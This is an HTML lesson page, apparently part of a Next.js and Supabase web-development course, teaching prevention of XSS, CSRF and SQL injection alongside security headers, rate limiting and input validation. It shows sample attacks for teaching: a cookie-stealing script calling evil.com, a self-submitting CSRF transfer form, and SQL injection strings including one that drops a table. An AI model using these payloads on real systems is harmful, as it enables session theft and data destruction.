@@ -1,0 +1,624 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Lesson 32: Web Security Best Practices | Full-Stack Web Development Curriculum</title>
+  <link rel="stylesheet" href="../styles.css">
+</head>
+<body>
+
+<!-- TOP NAV -->
+<nav class="lesson-nav">
+  <a href="31-rbac.html">&larr; Previous: Role-Based Access Control</a>
+  <span>Lesson 32 of 56</span>
+  <a href="33-spam-bot-protection.html">Next: Spam &amp; Bot Protection &rarr;</a>
+</nav>
+
+<!-- HEADER -->
+<header class="lesson-header" style="background: linear-gradient(135deg, #7f1d1d 0%, #dc2626 100%);">
+  <div class="phase-badge" style="background: rgba(255,255,255,0.2);">Phase 7: Authentication &amp; Security</div>
+  <h1>Web Security Best Practices</h1>
+  <p class="lesson-subtitle">Protecting your application against the most common attacks on the web</p>
+</header>
+
+<!-- MAIN CONTENT -->
+<div class="lesson-content">
+
+  <!-- LEARNING OBJECTIVES -->
+  <div class="learning-objectives">
+    <h2>What You Will Learn</h2>
+    <ul>
+      <li>The OWASP Top 10 most critical web application security risks</li>
+      <li>Cross-Site Scripting (XSS): what it is, types, and prevention</li>
+      <li>Cross-Site Request Forgery (CSRF): how it works and how to stop it</li>
+      <li>SQL Injection: what it is and why parameterized queries prevent it</li>
+      <li>Essential security headers and how to implement them in middleware</li>
+      <li>Rate limiting: preventing brute force attacks</li>
+      <li>Server-side input validation with Zod</li>
+      <li>Environment variable security and the NEXT_PUBLIC_ prefix</li>
+    </ul>
+  </div>
+
+  <!-- SECTION 1: OWASP TOP 10 -->
+  <h2>OWASP Top 10: The Most Critical Risks</h2>
+
+  <p>The <strong>OWASP (Open Web Application Security Project) Top 10</strong> is the definitive list of the most critical security risks for web applications. It is updated every few years based on real attack data from thousands of organizations. Think of it as the "most common ways hackers break into websites."</p>
+
+  <table>
+    <thead>
+      <tr>
+        <th>#</th>
+        <th>Risk</th>
+        <th>What It Means</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr><td>A01</td><td>Broken Access Control</td><td>Users can act outside their intended permissions</td></tr>
+      <tr><td>A02</td><td>Cryptographic Failures</td><td>Sensitive data exposed due to weak/missing encryption</td></tr>
+      <tr><td>A03</td><td>Injection</td><td>Untrusted data sent to an interpreter (SQL, XSS, etc.)</td></tr>
+      <tr><td>A04</td><td>Insecure Design</td><td>Missing security controls in the architecture</td></tr>
+      <tr><td>A05</td><td>Security Misconfiguration</td><td>Default settings, unnecessary features, missing headers</td></tr>
+      <tr><td>A06</td><td>Vulnerable Components</td><td>Using libraries with known security holes</td></tr>
+      <tr><td>A07</td><td>Authentication Failures</td><td>Weak login systems, session management flaws</td></tr>
+      <tr><td>A08</td><td>Data Integrity Failures</td><td>Code and data that can be modified without verification</td></tr>
+      <tr><td>A09</td><td>Security Logging Failures</td><td>Attacks go undetected due to poor monitoring</td></tr>
+      <tr><td>A10</td><td>Server-Side Request Forgery</td><td>Server tricked into making requests to unintended destinations</td></tr>
+    </tbody>
+  </table>
+
+  <p>We will focus on the attacks most relevant to our Next.js + Supabase stack: XSS, CSRF, SQL injection, security headers, and input validation.</p>
+
+  <!-- SECTION 2: XSS -->
+  <h2>XSS (Cross-Site Scripting)</h2>
+
+  <p><strong>Cross-Site Scripting (XSS)</strong> is an attack where a hacker injects malicious JavaScript code into a web page that other users see. When the victim's browser loads the page, it executes the attacker's code as if it were legitimate -- because the browser trusts code that comes from the same domain.</p>
+
+  <h3>What Can an XSS Attack Do?</h3>
+  <ul>
+    <li><strong>Steal session cookies</strong> (if not HttpOnly) and impersonate the user</li>
+    <li><strong>Redirect users</strong> to phishing pages that look like your site</li>
+    <li><strong>Read sensitive data</strong> displayed on the page</li>
+    <li><strong>Modify the page content</strong> to show fake information</li>
+    <li><strong>Capture keystrokes</strong> including passwords being typed</li>
+  </ul>
+
+  <h3>Types of XSS</h3>
+
+  <p><strong>Stored XSS (Persistent):</strong> The malicious script is saved in the database (e.g., in a blog comment or user profile) and served to every user who views that content.</p>
+
+  <pre><code>// Attacker submits this as a "blog comment":
+&lt;script&gt;fetch('https://evil.com/steal?cookie=' + document.cookie)&lt;/script&gt;
+
+// If the server stores it and later renders it without escaping:
+&lt;div class="comment"&gt;
+  &lt;script&gt;fetch('https://evil.com/steal?cookie=' + document.cookie)&lt;/script&gt;
+&lt;/div&gt;
+// Every user who views this page now sends their cookies to the attacker!</code></pre>
+
+  <p><strong>Reflected XSS (Non-Persistent):</strong> The malicious script is part of the URL and gets reflected back in the response. The attacker tricks the victim into clicking a crafted link.</p>
+
+  <pre><code>// Attacker sends victim this URL:
+https://yoursite.com/search?q=&lt;script&gt;alert('hacked')&lt;/script&gt;
+
+// If the server includes the query in the response without escaping:
+&lt;p&gt;Search results for: &lt;script&gt;alert('hacked')&lt;/script&gt;&lt;/p&gt;</code></pre>
+
+  <h3>XSS Prevention</h3>
+
+  <p><strong>1. Output Encoding (Escaping):</strong> Convert special characters to their HTML entity equivalents so they are displayed as text, not executed as code:</p>
+
+  <pre><code>// Dangerous: inserting raw HTML
+element.innerHTML = userInput;
+// If userInput is "&lt;script&gt;alert('xss')&lt;/script&gt;"
+// The browser EXECUTES the script!
+
+// Safe: using textContent (automatically escapes)
+element.textContent = userInput;
+// The browser DISPLAYS "&lt;script&gt;alert('xss')&lt;/script&gt;" as text</code></pre>
+
+  <p><strong>2. React's Built-In Protection:</strong> React automatically escapes values in JSX. This is one of React's biggest security benefits:</p>
+
+  <pre><code>// React automatically escapes this -- SAFE
+const userInput = '&lt;script&gt;alert("xss")&lt;/script&gt;';
+return &lt;p&gt;{userInput}&lt;/p&gt;;
+// Renders: &lt;p&gt;&amp;lt;script&amp;gt;alert("xss")&amp;lt;/script&amp;gt;&lt;/p&gt;
+// The script is displayed as text, not executed
+
+// DANGER: dangerouslySetInnerHTML bypasses React's protection
+return &lt;div dangerouslySetInnerHTML={{ __html: userInput }} /&gt;;
+// The script EXECUTES! Never use this with untrusted data.</code></pre>
+
+  <div class="warning-box">
+    <strong>Never use <code>dangerouslySetInnerHTML</code> with user-provided content.</strong> The name literally has "dangerous" in it for a reason. If you must render HTML (e.g., from a Markdown editor), use a sanitization library like DOMPurify to strip malicious tags first.
+  </div>
+
+  <p><strong>3. Content Security Policy (CSP) Header:</strong> A CSP header tells the browser which sources of scripts, styles, and other resources are trusted. Scripts from untrusted sources are blocked:</p>
+
+  <pre><code>// Only allow scripts from your own domain
+Content-Security-Policy: script-src 'self'
+
+// Allow scripts from your domain and specific CDNs
+Content-Security-Policy: script-src 'self' https://cdn.example.com</code></pre>
+
+  <!-- SECTION 3: CSRF -->
+  <h2>CSRF (Cross-Site Request Forgery)</h2>
+
+  <p><strong>Cross-Site Request Forgery (CSRF)</strong> tricks a user's browser into making a request to your site without their knowledge or consent. Because the browser automatically includes cookies with every request, the forged request appears to be from the authenticated user.</p>
+
+  <h3>How CSRF Works</h3>
+
+  <div class="diagram">
+1. User logs into bank.com (session cookie is set)
+2. User visits evil.com (in another tab)
+3. evil.com has a hidden form:
+
+   &lt;form action="https://bank.com/transfer" method="POST"&gt;
+     &lt;input type="hidden" name="to" value="attacker" /&gt;
+     &lt;input type="hidden" name="amount" value="10000" /&gt;
+   &lt;/form&gt;
+   &lt;script&gt;document.forms[0].submit();&lt;/script&gt;
+
+4. Browser sends POST to bank.com WITH the user's session cookie
+5. bank.com thinks it's a legitimate request from the user
+6. Money is transferred to the attacker!
+  </div>
+
+  <h3>CSRF Prevention</h3>
+
+  <p><strong>1. SameSite Cookies (Primary Defense):</strong> As we learned in Lesson 29, setting <code>SameSite=Lax</code> or <code>SameSite=Strict</code> on your session cookies prevents them from being sent with cross-origin requests:</p>
+
+  <pre><code>// With SameSite=Lax, the bank's session cookie is NOT sent
+// when evil.com submits a form to bank.com
+cookieStore.set('session', value, {
+  sameSite: 'lax',  // Prevents CSRF
+});</code></pre>
+
+  <p><strong>2. CSRF Tokens:</strong> For extra protection (especially for sensitive operations), generate a random token on the server, include it in forms as a hidden field, and verify it when the form is submitted. An attacker's page cannot read or predict the token:</p>
+
+  <pre><code>// Server generates a token and includes it in the form
+&lt;form method="POST" action="/transfer"&gt;
+  &lt;input type="hidden" name="csrf_token" value="random-unique-token-123" /&gt;
+  &lt;!-- other fields --&gt;
+&lt;/form&gt;
+
+// Server verifies the token matches what it issued
+if (request.body.csrf_token !== expectedToken) {
+  return new Response('Invalid CSRF token', { status: 403 });
+}</code></pre>
+
+  <!-- SECTION 4: SQL INJECTION -->
+  <h2>SQL Injection</h2>
+
+  <p><strong>SQL Injection</strong> occurs when an attacker includes SQL code in user input that gets executed by your database. It is one of the oldest and most devastating web attacks.</p>
+
+  <pre><code>// VULNERABLE CODE -- string concatenation in SQL
+const query = `SELECT * FROM users WHERE email = '${userInput}'`;
+
+// If userInput is: ' OR '1'='1
+// The query becomes:
+// SELECT * FROM users WHERE email = '' OR '1'='1'
+// This returns ALL users because '1'='1' is always true!
+
+// Even worse, if userInput is: '; DROP TABLE users; --
+// The query becomes:
+// SELECT * FROM users WHERE email = ''; DROP TABLE users; --'
+// This DELETES your entire users table!</code></pre>
+
+  <h3>Prevention: Parameterized Queries</h3>
+  <p>Never build SQL queries by concatenating user input. Use parameterized queries (also called prepared statements) where user input is treated as data, never as SQL code:</p>
+
+  <pre><code>// SAFE: Parameterized query -- user input is a parameter, not part of SQL
+const { data } = await supabase
+  .from('users')
+  .select('*')
+  .eq('email', userInput);  // Supabase handles parameterization automatically
+
+// The Supabase client NEVER concatenates user input into SQL.
+// It sends the query structure and parameters separately.
+// No matter what the user types, it's treated as a data value.</code></pre>
+
+  <div class="info-box">
+    <strong>Supabase handles this for you.</strong> The Supabase JavaScript client uses parameterized queries internally. When you use methods like <code>.eq()</code>, <code>.insert()</code>, <code>.update()</code>, etc., user input is always treated as data, never as SQL code. You would have to deliberately bypass the client to be vulnerable to SQL injection.
+  </div>
+
+  <!-- SECTION 5: SECURITY HEADERS -->
+  <h2>Security Headers</h2>
+
+  <p>Security headers are HTTP response headers that instruct the browser to enable or disable certain security features. They are your first line of defense against many common attacks, and they cost nothing to implement.</p>
+
+  <h3>Essential Headers</h3>
+
+  <table>
+    <thead>
+      <tr>
+        <th>Header</th>
+        <th>Purpose</th>
+        <th>Recommended Value</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr>
+        <td><code>X-Frame-Options</code></td>
+        <td>Prevents your site from being embedded in iframes (clickjacking protection)</td>
+        <td><code>DENY</code></td>
+      </tr>
+      <tr>
+        <td><code>X-Content-Type-Options</code></td>
+        <td>Prevents browser from guessing content types (MIME sniffing attack)</td>
+        <td><code>nosniff</code></td>
+      </tr>
+      <tr>
+        <td><code>Referrer-Policy</code></td>
+        <td>Controls how much URL info is sent when navigating to another site</td>
+        <td><code>strict-origin-when-cross-origin</code></td>
+      </tr>
+      <tr>
+        <td><code>Permissions-Policy</code></td>
+        <td>Disables browser features you do not use (camera, microphone, etc.)</td>
+        <td><code>geolocation=(), microphone=(), camera=()</code></td>
+      </tr>
+      <tr>
+        <td><code>X-XSS-Protection</code></td>
+        <td>Legacy XSS filter for older browsers</td>
+        <td><code>1; mode=block</code></td>
+      </tr>
+      <tr>
+        <td><code>Strict-Transport-Security</code></td>
+        <td>Forces HTTPS for all future requests (HSTS)</td>
+        <td><code>max-age=31536000; includeSubDomains</code></td>
+      </tr>
+      <tr>
+        <td><code>Content-Security-Policy</code></td>
+        <td>Controls which resources the browser can load</td>
+        <td>Varies by application</td>
+      </tr>
+    </tbody>
+  </table>
+
+  <h3>Implementing Headers in Middleware</h3>
+  <pre><code>// middleware.ts
+import { NextResponse } from 'next/server';
+import type { NextRequest } from 'next/server';
+
+function addSecurityHeaders(response: NextResponse): void {
+  // Prevent clickjacking -- no one can embed our site in an iframe
+  response.headers.set('X-Frame-Options', 'DENY');
+
+  // Prevent MIME type sniffing
+  response.headers.set('X-Content-Type-Options', 'nosniff');
+
+  // Control referrer information
+  response.headers.set('Referrer-Policy', 'strict-origin-when-cross-origin');
+
+  // Disable unnecessary browser features
+  response.headers.set(
+    'Permissions-Policy',
+    'geolocation=(), microphone=(), camera=(), payment=()'
+  );
+
+  // Legacy XSS protection for older browsers
+  response.headers.set('X-XSS-Protection', '1; mode=block');
+}
+
+export async function middleware(request: NextRequest) {
+  const response = NextResponse.next();
+
+  // Add security headers to EVERY response
+  addSecurityHeaders(response);
+
+  // ... rest of middleware (auth checks, etc.)
+  return response;
+}</code></pre>
+
+  <div class="csk-connection">
+    <strong>CSK Connection</strong>
+    CSK's <code>middleware.ts</code> sets five security headers on every response via the <code>addSecurityHeaders()</code> function: <code>X-Frame-Options: DENY</code>, <code>X-Content-Type-Options: nosniff</code>, <code>Referrer-Policy: strict-origin-when-cross-origin</code>, <code>Permissions-Policy</code> (disabling geolocation, microphone, camera, and payment), and <code>X-XSS-Protection: 1; mode=block</code>.
+  </div>
+
+  <!-- SECTION 6: RATE LIMITING -->
+  <h2>Rate Limiting</h2>
+
+  <p><strong>Rate limiting</strong> restricts how many requests a user (or IP address) can make in a given time period. Without it, attackers can:</p>
+  <ul>
+    <li><strong>Brute force login:</strong> Try thousands of password combinations per second</li>
+    <li><strong>Spam forms:</strong> Submit your contact form thousands of times</li>
+    <li><strong>DDoS your server:</strong> Overwhelm it with requests until it crashes</li>
+  </ul>
+
+  <h3>In-Memory Rate Limiter</h3>
+  <p>A simple but effective approach for single-server deployments:</p>
+
+  <pre><code>// lib/rate-limit.ts
+
+// Track requests per IP address
+const requestCounts = new Map&lt;string, { count: number; resetTime: number }&gt;();
+
+interface RateLimitConfig {
+  windowMs: number;     // Time window in milliseconds
+  maxRequests: number;  // Max requests per window
+}
+
+export function checkRateLimit(
+  ip: string,
+  config: RateLimitConfig = { windowMs: 60_000, maxRequests: 10 }
+): { allowed: boolean; remaining: number } {
+  const now = Date.now();
+  const record = requestCounts.get(ip);
+
+  // If no record or window expired, start fresh
+  if (!record || now > record.resetTime) {
+    requestCounts.set(ip, {
+      count: 1,
+      resetTime: now + config.windowMs,
+    });
+    return { allowed: true, remaining: config.maxRequests - 1 };
+  }
+
+  // Increment count
+  record.count++;
+
+  // Check if over limit
+  if (record.count > config.maxRequests) {
+    return { allowed: false, remaining: 0 };
+  }
+
+  return { allowed: true, remaining: config.maxRequests - record.count };
+}
+
+// Clean up old entries periodically (prevent memory leak)
+setInterval(() =&gt; {
+  const now = Date.now();
+  for (const [ip, record] of requestCounts) {
+    if (now > record.resetTime) {
+      requestCounts.delete(ip);
+    }
+  }
+}, 60_000);  // Clean up every minute</code></pre>
+
+  <h3>Using the Rate Limiter in an API Route</h3>
+  <pre><code>// app/api/contact/route.ts
+import { NextRequest, NextResponse } from 'next/server';
+import { checkRateLimit } from '@/lib/rate-limit';
+
+export async function POST(request: NextRequest) {
+  // Get client IP
+  const ip = request.headers.get('x-forwarded-for') || 'unknown';
+
+  // Check rate limit: max 10 requests per minute
+  const { allowed, remaining } = checkRateLimit(ip, {
+    windowMs: 60_000,
+    maxRequests: 10,
+  });
+
+  if (!allowed) {
+    return NextResponse.json(
+      { error: 'Too many requests. Please try again later.' },
+      {
+        status: 429,
+        headers: {
+          'Retry-After': '60',  // Tell client when to retry
+        },
+      }
+    );
+  }
+
+  // Process the request normally...
+}</code></pre>
+
+  <div class="csk-connection">
+    <strong>CSK Connection</strong>
+    CSK's contact form API route implements rate limiting with a maximum of 10 requests per minute per IP address. When the limit is exceeded, the API returns a 429 (Too Many Requests) status code with a <code>Retry-After</code> header.
+  </div>
+
+  <!-- SECTION 7: INPUT VALIDATION -->
+  <h2>Input Validation with Zod</h2>
+
+  <p><strong>Never trust data from the client.</strong> Even if you have client-side validation, an attacker can bypass it by sending requests directly to your API (using curl, Postman, or their own script). Server-side validation is the only validation that matters for security.</p>
+
+  <h3>Why Zod?</h3>
+  <p><strong>Zod</strong> is a TypeScript-first schema validation library. It lets you define the shape and constraints of your data, validates incoming data against that shape, and gives you fully typed results:</p>
+
+  <pre><code>import { z } from 'zod';
+
+// Define the expected shape of contact form data
+const contactFormSchema = z.object({
+  name: z.string()
+    .min(1, 'Name is required')
+    .max(100, 'Name must be under 100 characters')
+    .trim(),
+  email: z.string()
+    .email('Please enter a valid email address')
+    .toLowerCase(),
+  message: z.string()
+    .min(10, 'Message must be at least 10 characters')
+    .max(5000, 'Message must be under 5000 characters')
+    .trim(),
+});
+
+// Type is automatically inferred from the schema
+type ContactFormData = z.infer&lt;typeof contactFormSchema&gt;;
+// { name: string; email: string; message: string; }</code></pre>
+
+  <h3>Using Zod in API Routes</h3>
+  <pre><code>export async function POST(request: NextRequest) {
+  const body = await request.json();
+
+  // Validate the input
+  const result = contactFormSchema.safeParse(body);
+
+  if (!result.success) {
+    // Validation failed -- return the specific errors
+    return NextResponse.json(
+      {
+        error: 'Validation failed',
+        details: result.error.flatten().fieldErrors,
+        // { name: ['Name is required'], email: ['Invalid email'] }
+      },
+      { status: 400 }
+    );
+  }
+
+  // result.data is now fully validated and typed
+  const { name, email, message } = result.data;
+  // TypeScript knows these are valid strings
+
+  // Process the validated data safely...
+}</code></pre>
+
+  <div class="info-box">
+    <strong>safeParse vs parse:</strong> Use <code>safeParse()</code> in API routes. It returns a result object with <code>success</code> and <code>error</code> fields instead of throwing an exception. This gives you control over how validation errors are returned to the client. Use <code>parse()</code> when you want to throw on invalid data (e.g., in internal functions where invalid data indicates a bug).
+  </div>
+
+  <!-- SECTION 8: ENVIRONMENT VARIABLE SECURITY -->
+  <h2>Environment Variable Security</h2>
+
+  <p>Environment variables store configuration and secrets. In Next.js, there is a critical naming convention that controls which variables are exposed to the browser:</p>
+
+  <h3>The NEXT_PUBLIC_ Prefix</h3>
+
+  <pre><code># These are ONLY available on the server (safe for secrets):
+DATABASE_URL=postgres://user:password@host:5432/db
+SUPABASE_SERVICE_ROLE_KEY=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
+SESSION_SECRET=a1b2c3d4e5f6...
+RESEND_API_KEY=re_123456789
+
+# These are available in BOTH server AND browser code (not for secrets):
+NEXT_PUBLIC_SUPABASE_URL=https://yourproject.supabase.co
+NEXT_PUBLIC_SUPABASE_ANON_KEY=eyJhbGciOi...
+NEXT_PUBLIC_APP_URL=https://yourdomain.com</code></pre>
+
+  <div class="warning-box">
+    <strong>The rule:</strong> If a variable starts with <code>NEXT_PUBLIC_</code>, it is bundled into the JavaScript that is sent to every user's browser. Anyone can see it. NEVER put secret keys, database passwords, or service role keys in <code>NEXT_PUBLIC_</code> variables.
+  </div>
+
+  <p>The <code>anon key</code> is safe to expose because it respects Row-Level Security policies. The <code>service_role key</code> bypasses RLS entirely and must NEVER be exposed to the browser.</p>
+
+  <h3>Which Keys Go Where?</h3>
+  <table>
+    <thead>
+      <tr>
+        <th>Variable</th>
+        <th>Prefix</th>
+        <th>Why</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr>
+        <td>Supabase URL</td>
+        <td><code>NEXT_PUBLIC_</code></td>
+        <td>Browser needs it to connect to Supabase</td>
+      </tr>
+      <tr>
+        <td>Supabase Anon Key</td>
+        <td><code>NEXT_PUBLIC_</code></td>
+        <td>Safe because RLS restricts access</td>
+      </tr>
+      <tr>
+        <td>Supabase Service Key</td>
+        <td>No prefix</td>
+        <td>Bypasses RLS -- server only</td>
+      </tr>
+      <tr>
+        <td>Session Secret</td>
+        <td>No prefix</td>
+        <td>Used for encryption -- server only</td>
+      </tr>
+      <tr>
+        <td>API Keys (Resend, etc.)</td>
+        <td>No prefix</td>
+        <td>Secret credentials -- server only</td>
+      </tr>
+      <tr>
+        <td>Database URL</td>
+        <td>No prefix</td>
+        <td>Contains password -- server only</td>
+      </tr>
+    </tbody>
+  </table>
+
+  <!-- SECTION 9: DEPENDENCY SECURITY -->
+  <h2>Dependency Security</h2>
+
+  <p>Your application depends on hundreds of npm packages. Each one is code written by someone else that runs in your application. A vulnerability in any dependency is a vulnerability in your application.</p>
+
+  <h3>npm audit</h3>
+  <pre><code># Check all dependencies for known vulnerabilities
+npm audit
+
+# Automatically fix vulnerabilities (when possible)
+npm audit fix
+
+# See detailed information about a specific vulnerability
+npm audit --json</code></pre>
+
+  <h3>Best Practices</h3>
+  <ul>
+    <li><strong>Run <code>npm audit</code> regularly</strong> -- at least before every deployment.</li>
+    <li><strong>Keep dependencies updated</strong> -- use <code>npm outdated</code> to see what needs updating.</li>
+    <li><strong>Use exact versions</strong> in production -- <code>package-lock.json</code> ensures everyone gets the same versions.</li>
+    <li><strong>Minimize dependencies</strong> -- every package you add is more code to trust and maintain.</li>
+    <li><strong>Review before installing</strong> -- check the package's download count, last update date, and GitHub issues before adding it.</li>
+  </ul>
+
+  <div class="csk-connection">
+    <strong>CSK Connection</strong>
+    CSK implements all of these security practices. The <code>middleware.ts</code> sets 5 security headers on every response. The contact API has rate limiting (10 requests per minute). All form inputs are validated with Zod schemas on the server. The <code>NEXT_PUBLIC_</code> prefix is used only for the Supabase URL and anon key -- all secret keys remain server-only. <code>npm audit</code> is part of the deployment checklist.
+  </div>
+
+  <!-- EXERCISES -->
+  <div class="exercises">
+    <h2>Exercises</h2>
+    <ol>
+      <li><strong>XSS Prevention:</strong> Given this React component, identify which line is vulnerable to XSS and fix it:
+        <pre><code>function UserProfile({ bio }: { bio: string }) {
+  return (
+    &lt;div&gt;
+      &lt;h1&gt;User Profile&lt;/h1&gt;
+      &lt;div dangerouslySetInnerHTML={{ __html: bio }} /&gt;
+    &lt;/div&gt;
+  );
+}</code></pre>
+      </li>
+      <li><strong>CSRF Understanding:</strong> Explain why a POST request from <code>evil.com</code> to <code>yoursite.com/api/transfer</code> would fail if the session cookie has <code>SameSite=Lax</code>. Under what condition would <code>SameSite=Lax</code> still send the cookie?</li>
+      <li><strong>Security Headers:</strong> Open your browser's developer tools on any website, go to the Network tab, click on the main document request, and examine the response headers. Which security headers are present? Which are missing?</li>
+      <li><strong>Zod Schema:</strong> Write a Zod schema for a user registration form that validates: email (valid format), password (minimum 12 characters), name (1-100 characters), and age (optional, but if provided must be 13-120).</li>
+      <li><strong>Environment Variable Audit:</strong> Review this <code>.env</code> file and identify which variables should NOT have the <code>NEXT_PUBLIC_</code> prefix:
+        <pre><code>NEXT_PUBLIC_SUPABASE_URL=https://abc.supabase.co
+NEXT_PUBLIC_SUPABASE_ANON_KEY=eyJ...
+NEXT_PUBLIC_SUPABASE_SERVICE_KEY=eyJ...
+NEXT_PUBLIC_DATABASE_URL=postgres://user:pass@host/db
+NEXT_PUBLIC_APP_NAME=My App
+SESSION_SECRET=abc123def456</code></pre>
+      </li>
+    </ol>
+  </div>
+
+  <!-- KEY TAKEAWAYS -->
+  <div class="key-takeaways">
+    <h2>Key Takeaways</h2>
+    <ul>
+      <li>The OWASP Top 10 is your checklist for the most critical web security risks.</li>
+      <li>XSS injects malicious scripts into pages. Prevent it with output encoding, React's auto-escaping, and CSP headers.</li>
+      <li>Never use <code>dangerouslySetInnerHTML</code> with untrusted data -- sanitize first.</li>
+      <li>CSRF tricks browsers into making authenticated requests. Prevent it with <code>SameSite=Lax</code> cookies and CSRF tokens.</li>
+      <li>SQL Injection exploits string concatenation in queries. Supabase's client uses parameterized queries automatically.</li>
+      <li>Set security headers (<code>X-Frame-Options</code>, <code>X-Content-Type-Options</code>, <code>Referrer-Policy</code>, <code>Permissions-Policy</code>) in middleware on every response.</li>
+      <li>Rate limiting prevents brute force attacks. A simple in-memory counter with a time window works for single-server deployments.</li>
+      <li>Validate ALL input on the server with Zod. Client-side validation is for UX only.</li>
+      <li>Only <code>NEXT_PUBLIC_</code> variables are exposed to the browser. Keep all secrets (service keys, database URLs, session secrets) without this prefix.</li>
+      <li>Run <code>npm audit</code> regularly and keep dependencies updated.</li>
+    </ul>
+  </div>
+
+</div>
+
+<!-- BOTTOM NAV -->
+<nav class="lesson-nav bottom">
+  <a href="31-rbac.html">&larr; Previous: Role-Based Access Control</a>
+  <span>Lesson 32 of 56</span>
+  <a href="33-spam-bot-protection.html">Next: Spam &amp; Bot Protection &rarr;</a>
+</nav>
+
+</body>
+</html>
